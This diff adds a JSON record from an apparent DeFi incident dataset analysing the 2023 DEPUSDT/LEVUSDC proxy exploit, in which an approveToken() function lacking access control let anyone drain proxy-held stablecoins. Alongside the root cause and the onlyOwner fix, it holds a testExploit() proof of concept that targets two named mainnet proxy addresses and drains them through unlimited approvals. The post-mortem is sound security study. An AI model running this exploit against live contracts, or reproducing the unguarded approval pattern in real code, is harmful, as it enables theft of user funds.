@@ -1,0 +1,34 @@
+{
+ "id": "2023__2023-06-09_DEPUSDT_LEVUSDC_ProxyApproval",
+ "source_file": "2023/2023-06-09_DEPUSDT_LEVUSDC_ProxyApproval.md",
+ "title": "DEPUSDT/LEVUSDC — Proxy Approval Vulnerability Analysis",
+ "date": "2023-06-09",
+ "protocol": "DEPUSDT / LEVUSDC",
+ "chain": "Ethereum",
+ "loss_raw": "~36K (LEVUSDC) + ~69K (DEPUSDT) = ~105K USD",
+ "loss_usd": null,
+ "root_cause": "No access control on the proxy contract's `approveToken()` function",
+ "attack_tx": null,
+ "vulnerable_contract": "0x7b190a92... (DEPUSDT Proxy)",
+ "classes": [
+  "proxy-storage"
+ ],
+ "code_before": [
+  "// ❌ approveToken with no access control\ninterface IProxy {\n    // ❌ No onlyOwner — callable by anyone\n    function approveToken(address token, address pool, uint256 amount) external;\n}\n\n// Proxy implementation (inferred)\ncontract LeverageProxy {\n    // ❌ No access control\n    function approveToken(address token, address pool, uint256 amount) external {\n        // Approves tokens held by the proxy to an arbitrary address\n        IERC20(token).approve(pool, amount);\n    }\n}",
+  "┌──────────────────────────────────────────────┐\n│  1. proxy.approveToken(USDT, attacker, MAX)  │\n│     ❌ No access control → unlimited approval granted     │\n└──────────────────────────────┬───────────────┘\n                               ▼\n┌──────────────────────────────────────────────┐\n│  2. USDT.transferFrom(proxy, attacker, all)  │\n│     → All proxy-held assets drained             │\n└──────────────────────────────────────────────┘\n  (Same attack applied to both DEPUSDT proxy and LEVUSDC proxy)"
+ ],
+ "code_after": [
+  "// ✅ Fix: Add access control\ncontract LeverageProxy is Ownable {\n    // ✅ Only callable by onlyOwner\n    function approveToken(address token, address pool, uint256 amount) external onlyOwner {\n        IERC20(token).approve(pool, amount);\n    }\n}",
+  "// ✅ Restrict calls to admin only\nmodifier onlyAdmin() {\n    require(msg.sender == admin, \"Not admin\");\n    _;\n}\nfunction approveToken(address token, address pool, uint256 amount) external onlyAdmin {\n    IERC20(token).approve(pool, amount);\n}"
+ ],
+ "steps": [
+  "1. proxy.approveToken(USDT, attacker, MAX)",
+  "❌ No access control → unlimited approval granted",
+  "2. USDT.transferFrom(proxy, attacker, all)",
+  "→ All proxy-held assets drained"
+ ],
+ "other_code": [
+  "// Root cause: No access control on the proxy contract's `approveToken()` function\n// Source code unverified — based on bytecode analysis",
+  "function testExploit() public {\n    // Attack DEPUSDT proxy\n    IProxy depProxy = IProxy(0x7b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f);\n\n    // 1. Grant unlimited approval of proxy-held USDT to attacker\n    depProxy.approveToken(address(usdt), address(this), type(uint256).max);\n\n    // 2. Use approval to drain all USDT\n    uint256 proxyBalance = usdt.balanceOf(address(depProxy));\n    usdt.transferFrom(address(depProxy), address(this), proxyBalance);\n\n    // Same attack on LEVUSDC proxy\n    IProxy levProxy = IProxy(0x2a2b195558cf89aa617979ce28880bbf7e17bc45);\n    levProxy.approveToken(address(usdc), address(this), type(uint256).max);\n    usdc.transferFrom(address(levProxy), address(this), usdc.balanceOf(address(levProxy)));\n}"
+ ]
+}
